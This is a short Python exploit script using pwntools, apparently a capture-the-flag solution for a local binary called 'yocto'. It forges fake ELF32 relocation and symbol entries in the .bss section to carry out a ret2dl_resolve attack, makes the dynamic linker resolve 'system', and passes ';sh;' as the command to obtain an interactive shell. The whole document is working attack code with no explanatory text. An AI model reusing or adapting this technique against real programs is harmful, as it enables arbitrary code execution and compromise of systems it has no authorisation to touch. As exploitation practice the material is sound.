from pwn import *

dl_linker = 0x80482a0
bss = 0x080495C0
symtab = 0x0804818c
strtab = 0x080481fc
jmppel = 0x08048270

rel_addr = bss + 20
reloc_offset = rel_addr - jmppel
system_addr = rel_addr + 8
st_name = system_addr - strtab

rel = p32(0x8049540) + p32(0x14607) # ELF32_Rel struct

sym = p32(st_name) # ELF32_Sym struct

pay = '.' + str(reloc_offset) + '.' + str(dl_linker)
pay += ";sh;" # command
pay += "\x90"*(20 - len(pay))

pay += rel + "system\x00" + "\x00" * 9 + sym
p = process("./yocto")
p.sendline(pay)
p.interactive()
